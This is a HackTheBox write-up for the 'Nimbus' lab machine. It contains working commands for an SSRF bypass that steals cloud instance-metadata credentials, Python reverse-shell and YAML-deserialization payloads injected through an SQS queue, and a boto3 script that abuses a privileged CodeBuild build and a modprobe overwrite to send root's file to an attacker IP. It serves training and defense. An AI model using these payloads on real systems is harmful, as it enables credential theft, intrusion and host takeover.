---
title: "Nimbus"
description: "HackTheBox Season 11 — SSRF to AWS IMDS creds, LocalStack SQS job injection into a container, then a CodeBuild + modprobe host escape to root."
---

<a href="https://labs.hackthebox.com/achievement/machine/1439304/912" style="display:block;max-width:560px;margin:1.5rem auto;text-decoration:none;border-radius:14px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:system-ui,-apple-system,sans-serif;">
  <div style="height:104px;background:#141D2B url('https://labs.hackthebox.com/images/achievementBG.png') center/cover;position:relative;">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e513f0-690d-4dc2-bd2c-946d3983d026-1780052541.png" alt="Nimbus HackTheBox machine avatar" width="76" height="76" style="position:absolute;left:50%;bottom:-38px;transform:translateX(-50%);border-radius:50%;background:#1A2332;box-shadow:0 0 0 4px #1A2332;" />
  </div>
  <div style="background:#1A2332;padding:52px 20px 22px;text-align:center;">
    <div style="color:#fff;font-size:1.2rem;font-weight:600;">Nimbus has been Pwned</div>
    <div style="height:1px;margin:14px auto;max-width:240px;background:linear-gradient(to right,transparent,#9FEF00,transparent);"></div>
    <div style="color:#A4B1CD;font-size:.9rem;"><span style="color:#fff;">d10m3d3s</span> pwned this machine</div>
    <div style="display:flex;justify-content:center;margin-top:20px;">
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">#1848</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">MACHINE RANK</div></div>
      <div style="flex:1;padding:4px;border-left:1px solid #111927;border-right:1px solid #111927;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">23 Jun 2026</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">PWN DATE</div></div>
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">1105</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">XP EARNED</div></div>
    </div>
  </div>
</a>

**Nimbus** is a cloud‑themed Linux box built on a **LocalStack** AWS stack. A job
scheduler that fetches YAML over HTTP is vulnerable to **SSRF**; bypassing its
filters reaches the **instance metadata service** and leaks IAM credentials.
Those keys expose an **SQS** job queue whose messages are executed — YAML
deserialization gives a shell **inside a container**. Escaping the container to
root abuses **CodeBuild** privileged builds plus a `/proc/sys/kernel/modprobe`
overwrite on the host.

:::note[Attack path at a glance]
SSRF filter bypass (octal IP + `.yaml` suffix) → **AWS IMDS** creds →
**SQS** queue → YAML‑deserialization job → shell in a **container** →
**CodeBuild** privileged build → `modprobe` overwrite → **root**.
:::

## Reconnaissance

### Nmap

```text title="nmap -sVC 10.129.17.90"
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
```

```bash
echo '10.129.17.90 nimbus.htb aws.nimbus.htb' | sudo tee -a /etc/hosts
```

## Web Enumeration

The site is a **job scheduler**: you submit a YAML job either by pasting it or by
providing a URL for the app to fetch. A health endpoint maps out the backend —
a queue, scheduler, and storage, all pointing at `aws.nimbus.htb`:

```json title="curl http://nimbus.htb/api/v1/health"
{"services":{"queue":{"endpoint":"http://aws.nimbus.htb","status":"ok"},
"scheduler":{"endpoint":"http://aws.nimbus.htb","status":"ok"},
"storage":{"endpoint":"http://aws.nimbus.htb","status":"ok"}},
"status":"healthy","version":"1.4.2"}
```

`aws.nimbus.htb` answers like an AWS API endpoint (LocalStack):

```xml title="curl http://aws.nimbus.htb"
<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error><Code>InvalidClientTokenId</Code>
  <Message>The security token included in the request is invalid.</Message></Error>
</ErrorResponse>
```

## SSRF → AWS credentials

The URL‑fetch feature is an SSRF primitive, but two filters guard it:

1. Internal/metadata IP addresses are blocked.
2. The URL must end in `.yaml`.

Both are bypassable. A trailing query string satisfies the `.yaml` check
(`...?a=test.yaml`), and encoding `169.254.169.254` in **octal**
(`0251.0376.0251.0376`) slips past the IP filter. First confirm the SSRF works
against an arbitrary host:

```bash title="SSRF sanity check"
curl http://nimbus.htb/jobs/preview -X POST \
  -d 'url=http%3A%2F%2F10.129.15.103%3A80%2F%3F%3D.yaml'
# → HTTP 301 from nginx, response echoed back = SSRF confirmed
```

Now pivot to the **instance metadata service** to read the IAM role, then its
credentials:

```bash title="Reach IMDS via octal-encoded 169.254.169.254"
# 1) role name
curl http://nimbus.htb/jobs/preview -X POST \
  -d 'url=http%3A%2F%2F0251.0376.0251.0376%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F%3Fa%3Dtest.yaml'
# → nimbus-web-role

# 2) credentials for that role
curl http://nimbus.htb/jobs/preview -X POST \
  -d 'url=http%3A%2F%2F0251.0376.0251.0376%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fnimbus-web-role%3Fa%3Dtest.yaml'
```

```json title="IMDS credentials"
{
  "Code": "Success",
  "AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
  "SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
  "Token": "IQoJb3JpZ2luX2VjEHQ...<snip>...RHe5VpDxKfM",
  "Expiration": "2026-06-22T19:23:01Z"
}
```

:::tip[SSRF filter bypass]
Alternate IP encodings (octal / hex / decimal) plus a satisfying suffix
(`?x=.yaml`) routinely defeat naive "block metadata IP" + "must end in .yaml"
checks.
:::

## AWS Enumeration

Load the stolen session and enumerate the LocalStack endpoint:

```bash title="aws --endpoint-url http://aws.nimbus.htb"
export AWS_ACCESS_KEY_ID="ASIAQX4PG7L2K9M3N5R8"
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQ...<snip>..."
export AWS_DEFAULT_REGION=us-east-1

aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

The interesting resource is an **SQS** job queue:

```json title="sqs list-queues"
{ "QueueUrls": [ "http://floci:4566/847219365028/nimbus-jobs" ] }
```

## Foothold — SQS job injection

The scheduler consumes messages from `nimbus-jobs` and executes the job. Pushing
a message with a shell payload gets code execution. A plain JSON `script` works
but the shell dies on the ~30‑second scheduler cycle:

```bash title="unstable — killed every 30s"
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body "{'name':'rev-shell2','schedule':'* 2 * * *','runtime':'python3.11','script': 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.64\",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'}"
```

A **YAML deserialization** payload (`!!python/object/apply`) spawns a detached
process that survives the cycle:

```bash title="stable — YAML deserialization"
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '!!python/object/apply:subprocess.Popen [["python3", "-c", "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.64\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])"]]'
```

## Inside a container

`/proc/mounts` shows an **overlayfs / containerd** root — we're in a Docker
container and need to escape:

```text title="mount (excerpt)"
overlay on / type overlay (rw,relatime,
  lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/165/fs:...,
  upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs, ...)
/dev/sda4 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
```

## Privilege Escalation — CodeBuild + modprobe escape

The same AWS role can drive **CodeBuild**. A build project with
`privilegedMode: True` runs on the host's container engine, so a build can reach
host kernel state. The trick: point `/proc/sys/kernel/modprobe` at a payload
dropped in the container's overlay `upperdir` (a real path on the host), then
trigger the kernel's modprobe by executing a file with an unknown binary format
(`\xff\xff\xff\xff`). The kernel runs our payload **as root on the host**, which
exfiltrates `root.txt`.

```python title="escape.py — CodeBuild privileged build → modprobe overwrite"
import boto3

ENDPOINT = "http://floci:4566"
REGION = "us-east-1"
ATTACKER_IP = "10.10.14.64"   # tun0
LPORT = 9005

buildspec = f"""version: 0.2
phases:
  build:
    commands:
      - id
      - cat /proc/self/status | grep Cap
      - |
        cat > /tmp/payload.sh << 'PYEOF'
        #!/bin/sh
        python3 -c "
        import socket
        s = socket.socket()
        s.connect(('{ATTACKER_IP}', {LPORT}))
        s.send(open('/root/root.txt','rb').read())
        s.close()
        "
        PYEOF
      - chmod +x /tmp/payload.sh
      - |
        upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
        echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
      - printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""

cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)
cb.create_project(
    name="nimbus-exploit",
    source={"type": "NO_SOURCE", "buildspec": buildspec},
    artifacts={"type": "NO_ARTIFACTS"},
    environment={
        "type": "LINUX_CONTAINER",
        "image": "floci/floci:latest",
        "computeType": "BUILD_GENERAL1_SMALL",
        "privilegedMode": True,
        "environmentVariables": [
            {"name": "BASH_FUNC_id%%",
             "value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
             "type": "PLAINTEXT"}
        ],
    },
    serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)
print("started:", cb.start_build(projectName="nimbus-exploit")["build"]["id"])
```

Catch the flag on your listener (`nc -lvnp 9005`).

## Takeaways

- **SSRF + IMDS is the cloud foothold pattern.** Weak allow/deny filters on a
  URL fetcher are one octal‑encoded request away from stolen IAM credentials.
- **Queues that execute their messages are RCE.** The SQS worker deserialized
  job YAML, so `!!python/object/apply` was direct code execution.
- **`privilegedMode` builds share the host kernel.** Combined with the
  `/proc/sys/kernel/modprobe` overwrite, a privileged CodeBuild container is a
  clean host escape to root.
